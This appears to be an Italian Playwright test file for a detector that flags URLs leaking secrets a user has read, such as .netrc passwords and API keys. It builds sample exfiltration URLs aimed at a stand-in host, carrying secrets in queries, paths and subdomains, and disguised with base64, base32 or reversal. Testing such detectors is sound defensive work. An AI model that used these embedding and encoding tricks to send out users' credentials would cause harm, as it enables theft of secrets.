// Verifica #587, giro 7 — il dato che porta un trattino dentro.
//
// IL SINTOMO. Il confronto fra l'indirizzo e il materiale letto lavora su due
// materie diverse, e la differenza è tutta lì:
//
//   • dell'INDIRIZZO si guarda la forma incollata: si tolgono separatori,
//     trattini e punti, e resta una stringa di sole lettere e cifre. È il modo
//     giusto: così un dato tagliato fra due parametri torna intero.
//   • del MATERIALE LETTO si prendono invece le parole spezzate a ogni
//     carattere che non sia una lettera o una cifra.
//
// Quindi una password che contiene un trattino, un punto o un trattino basso —
// cioè quasi tutte — non diventa mai una "parola" del materiale protetto:
// diventa tre parole corte, nessuna delle quali è un dato riconoscibile.
//
//   password letta da un file: Segreto-Netrc-2026
//   https://male.esempio/?d=Segreto-Netrc-2026   → non chiede niente
//   https://male.esempio/?d=SegretoNetrc2026     → chiede conferma
//
// È lo stesso dato, in chiaro, senza nessun travestimento: cambia solo che nel
// file ha i trattini che l'utente ci ha messo.
//
// Seconda porta, la terza codifica. In un indirizzo si sciolgono già il base64 e
// l'esadecimale; il base32 no, e non costa niente riconoscerlo — su venti
// indirizzi veri nessun pezzo si riapre come base32, quindi non porta falsi
// allarmi.
//
// COSA DEVE RESTARE COM'È: nessun avviso sugli indirizzi di tutti i giorni.

import { test, expect } from '@playwright/test';
import { createRequire } from 'node:module';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const RADICE = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
require(resolve(RADICE, 'src/shared/urlExfil.js'));
const E = globalThis.SN_URL_EXFIL;

const MEMORIA = 'Nome: Mario Rossi\nEmail: mario.rossi@gmail.com';
// Il registro dei link della scheda tiene gli ultimi 24 (contextTaint.js).
const MAX_LINK = 24;

function apriInFila(urls, letto) {
  const carichi = [];
  let motivo = '';
  for (const u of urls) {
    const v = E.assess(u, {
      corpus: MEMORIA, letto, fromUntrusted: true, carichiPrima: carichi.slice(),
    });
    if (v.exfil && !motivo) motivo = v.reason;
    carichi.push(E.caricoUnito(u));
    while (carichi.length > MAX_LINK) carichi.shift();
  }
  return motivo;
}
const apre = (url, letto) => apriInFila([url], letto);

function base32(s) {
  const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = '';
  for (const c of Buffer.from(s)) bits += c.toString(2).padStart(8, '0');
  let out = '';
  for (let i = 0; i < bits.length; i += 5) out += A[parseInt(bits.slice(i, i + 5).padEnd(5, '0'), 2)];
  return out;
}

// Segreti come stanno scritti in un file vero: col loro trattino dentro.
const SEGRETI = [
  ['la password di .netrc', 'Segreto-Netrc-2026'],
  ['una passphrase a parole', 'cavallo-batteria-graffetta-blu'],
  ['una password col trattino basso', 'Estate_Rossa_2026'],
  ['una chiave scritta a gruppi', '9f3b.d2a7.1c4e.8b60'],
  ['un token con un punto dentro', 'eyJhbGciOi.JIUzI1NiJ9.abcd1234'],
];

const fileCon = (seg) => `# credenziali del server di casa\nmachine ftp login mario password ${seg}\nport 21\n`;

test.describe('#587 — il dato che porta un trattino dentro', () => {
  // ── Porta 1: il dato esce in chiaro ──────────────────────────────────────
  test('un segreto con la punteggiatura dentro non esce senza conferma', () => {
    for (const [nome, seg] of SEGRETI) {
      const letto = fileCon(seg);
      expect(apre(`https://male.esempio/?d=${encodeURIComponent(seg)}`, letto),
        `${nome} (${seg}) esce in chiaro: deve far comparire l’avviso`).toBeTruthy();
    }
  });

  // ── Porta 2: lo stesso dato nel percorso e nel sottodominio ──────────────
  test('lo stesso segreto nel percorso o nel sottodominio non esce senza conferma', () => {
    const seg = 'Segreto-Netrc-2026';
    const letto = fileCon(seg);
    expect(apre(`https://male.esempio/${seg}/x`, letto), 'nel percorso deve far comparire l’avviso').toBeTruthy();
    expect(apre(`https://${seg.replace(/[^A-Za-z0-9]/g, '')}.male.esempio/`, letto), 'nel sottodominio deve far comparire l’avviso').toBeTruthy();
  });

  // ── Porta 3: lo stesso dato travestito ───────────────────────────────────
  test('lo stesso segreto in base64 o all’indietro non esce senza conferma', () => {
    const seg = 'Segreto-Netrc-2026';
    const letto = fileCon(seg);
    const nudo = seg.replace(/[^A-Za-z0-9]/g, '');
    expect(apre(`https://male.esempio/?d=${Buffer.from(nudo).toString('base64')}`, letto), 'in base64 deve far comparire l’avviso').toBeTruthy();
    expect(apre(`https://male.esempio/?d=${nudo.split('').reverse().join('')}`, letto), 'all’indietro deve far comparire l’avviso').toBeTruthy();
  });

  // ── Porta 4: la terza codifica ───────────────────────────────────────────
  test('un dato riscritto in base32 non esce senza conferma', () => {
    const chiave = 'sk-or-v1-9f3bd2a71c4e8b60';
    const letto = `OPENROUTER_API_KEY=${chiave}\n`;
    expect(apre(`https://male.esempio/?d=${base32('9f3bd2a71c4e8b60')}`, letto), 'la chiave in base32 deve far comparire l’avviso').toBeTruthy();
    const pwd = 'CasaVerde2026Rossa';
    expect(apre(`https://male.esempio/?d=${base32(pwd)}`, `password: ${pwd}\n`), 'la password in base32 deve far comparire l’avviso').toBeTruthy();
  });

  // ── La controprova: lo stesso dato senza punteggiatura ───────────────────
  test('lo stesso dato scritto tutto attaccato faceva già comparire l’avviso', () => {
    for (const [nome, seg] of SEGRETI) {
      const nudo = seg.replace(/[^A-Za-z0-9]/g, '');
      const letto = fileCon(nudo);
      expect(apre(`https://male.esempio/?d=${nudo}`, letto),
        `${nome} senza punteggiatura faceva già comparire l’avviso`).toBeTruthy();
    }
  });

  // ── Quello che deve restare com'è: nessun avviso sui link veri ───────────
  test('gli indirizzi di tutti i giorni continuano ad aprirsi e basta', () => {
    const letto = `Appunto viaggio Firenze
Hotel Duomo, prenotazione 2026-05-04; Uffizi, giardino di Boboli, trattoria Sostanza
bolletta enel, cliente 3901882771
password del server: Segreto-Netrc-2026
mario.rossi@example.com
`;
    const veri = [
      'https://it.wikipedia.org/wiki/Storia_della_matematica',
      'https://www.giallozafferano.it/ricette/Spaghetti-alla-carbonara.html',
      'https://docs.google.com/document/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit',
      'https://www.amazon.it/dp/B08N5WRWNW',
      'https://open.spotify.com/track/4cOdK2wGLETKBW3PvgPWqT',
      'https://x.com/nasa/status/1793048220145041484',
      'https://www.booking.com/hotel/it/duomo-firenze.it.html?aid=304142&sid=9f8a2b3c4d5e6f7a8b9c0d1e2f3a4b5c',
      'https://www.ikea.com/it/it/p/billy-libreria-bianco-00263850/',
      'https://www.corriere.it/cronache/26_settembre_12/energia-bollette-aumenti.shtml',
      'https://www.enel.it/it/area-clienti/bolletta',
      'https://www.poste.it/servizi-online.html',
      'https://maps.google.com/maps?q=Hotel+Duomo+Firenze',
      'https://www.uffizi.it/gli-uffizi',
      'https://www.repubblica.it/economia/2026/09/12/news/bollette_luce-424242/',
      'https://github.com/anthropics/claude-code/blob/main/README.md',
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      'https://drive.google.com/file/d/1aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456/view',
      'https://www.trenitalia.com/it/offerte/firenze-roma.html',
      'https://www.tripadvisor.it/Restaurant_Review-g187895-d1234567-Reviews-Trattoria_Sostanza-Firenze.html',
      'https://www.ilsole24ore.com/art/energia-AFxyz12',
    ];
    for (const u of veri) {
      expect(apre(u, letto), `«${u}» non porta fuori niente: deve aprirsi e basta`).toBeFalsy();
    }
    // E anche aperti uno dopo l'altro nella stessa scheda.
    expect(apriInFila(veri, letto), 'venti indirizzi veri in fila non devono far comparire nessun avviso').toBeFalsy();
  });
});
